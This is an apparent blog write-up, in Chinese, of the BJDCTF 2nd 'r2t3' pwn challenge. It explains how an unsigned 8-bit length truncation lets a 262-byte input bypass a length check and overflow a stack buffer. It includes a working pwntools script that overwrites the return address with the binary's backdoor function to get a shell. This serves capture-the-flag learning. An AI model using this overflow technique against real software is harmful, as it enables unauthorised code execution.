---
title: "BJDCTF 2nd Pwn R2t3"
date: 2020-03-23T23:24:57+08:00
author: NiceSeven
categories:
  - BJDCTF 2nd
tags:
  - Pwn
---

# BJDCTF 2nd Pwn R2t3

考点：短整数溢出，参考XCTF中的int_overflow

![image-20200324000627748](/images/image-20200324000627748.png)

![image-20200324000728896](/images/image-20200324000728896.png)

可以读入0x400进入buf，要满足条件3<v3<=8才能绕过判断执行strcpy，可以发现dest的栈只有0x11，所以这里存在栈溢出，可以发现v3是无符号整形的数据，__int8意味着只能存8位的数字转换成十进制就是0~255这256个字节超出部分就截断了，但是read却可以读0x400进去所以可以利用整形溢出来bypass这个if

![image-20200324174335835](/images/image-20200324174335835.png)

![image-20200324174711217](/images/image-20200324174711217.png)

![image-20200324174730058](/images/image-20200324174730058.png)

256的2进制串后8位为0000 0000表示10进制数为0，如果通过strlen(s)返回的字节数是256那么v3实际上就表示0

同理257表示1，258=256+2表示2，259=256+3表示3，所以要满足3<v3<8,，就是256+4=260 < s <264=256+8

本题选择入读262个字符

```python
#!/usr/bin/env python2
#-*- coding=UTF-8 -*-
from pwn import *

context.log_level ='debug'
sh = process('./r2t3')

backdoor_addr = 0x804858b

payload = 'a'*21
payload += p32(backdoor_addr)
payload += 'a'*(262-len(payload))

sh.sendafter('name:',payload)
sh.interactive()
```

![image-20200324194959283](/images/image-20200324194959283.png)

问题：

读入0x400可以打本地(kali2020.1-glibc-2.29)和buuctf，但是读262字节只能打buu不能打本地，换成ubuntu19.04-glibc-2.29之后读入262可以打本地了
